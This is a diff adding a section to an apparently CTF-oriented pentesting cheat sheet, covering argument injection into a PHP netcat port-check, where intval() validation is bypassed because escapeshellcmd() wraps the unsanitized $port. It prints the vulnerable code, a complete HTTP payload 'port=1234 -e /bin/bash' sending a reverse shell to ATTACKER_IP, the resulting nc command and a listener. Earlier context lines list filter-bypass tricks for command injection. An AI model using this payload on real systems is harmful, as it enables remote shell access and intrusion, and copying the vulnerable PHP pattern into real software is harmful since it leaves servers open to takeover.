@@ -439,3 +439,58 @@ Breakdown:
 - `%09` = tab (space bypass)
 - `$(rev<<<'tac')` = reversed `cat` command
 - `${PATH:0:1}` = `/` character
+
+---
+
+## Netcat Port Parameter Injection
+
+When PHP uses `escapeshellcmd()` instead of `escapeshellarg()`, you can inject additional arguments.
+
+### Vulnerable Code Pattern
+
+```php
+// VULNERABLE - uses original unsanitized $port in exec
+$port = trim($_POST['port']);
+$port_int = intval($port);          // Sanitized version
+$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
+
+if ($valid_ip && $valid_port) {
+    // Bug: Uses $port (unsanitized) instead of $port_int!
+    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
+    exec($ec . " 2>&1", $output, $rc);
+}
+```
+
+### Exploitation
+
+The `intval()` function extracts the leading integer, so `1234 -e /bin/bash` becomes `1234` for validation but the full string is used in the command.
+
+**Payload:**
+
+```http
+POST /index.php?expertmode=tcp HTTP/1.1
+Host: target.htb
+Content-Type: application/x-www-form-urlencoded
+
+ip=ATTACKER_IP&port=1234 -e /bin/bash
+```
+
+**Resulting command:**
+
+```bash
+/usr/bin/nc -vz ATTACKER_IP 1234 -e /bin/bash
+```
+
+**Listener:**
+
+```bash
+nc -nlvp 1234
+# Receive reverse shell
+```
+
+### Key Points
+
+- `intval("1234 -e /bin/bash")` returns `1234` (passes validation)
+- Original `$port` variable retains full payload
+- `escapeshellcmd()` doesn't prevent argument injection, only escapes shell metacharacters
+- Always look for type coercion bugs where sanitized values aren't used in final command
